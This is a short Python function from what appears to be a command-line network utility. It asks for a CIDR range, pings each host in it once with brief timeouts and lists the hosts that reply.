def cmd_ping_sweep(ctx):
    import ipaddress
    target = ctx["ask"]("CIDR (e.g. 192.168.1.0/24)", "192.168.1.0/24")
    try:
        net = ipaddress.ip_network(target, strict=False)
    except ValueError as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Bad CIDR: {exc}[/]")
        return
    alive = []
    for host in list(net.hosts())[:254]:
        code, _, _ = _safe_run(["ping", "-c", "1", "-W", "1", str(host)], timeout=2)
        if code == 0:
            alive.append(str(host))
    ctx["console"].print(f"[{ctx['theme'].success}]Alive hosts:[/] {', '.join(alive) or 'none'}")


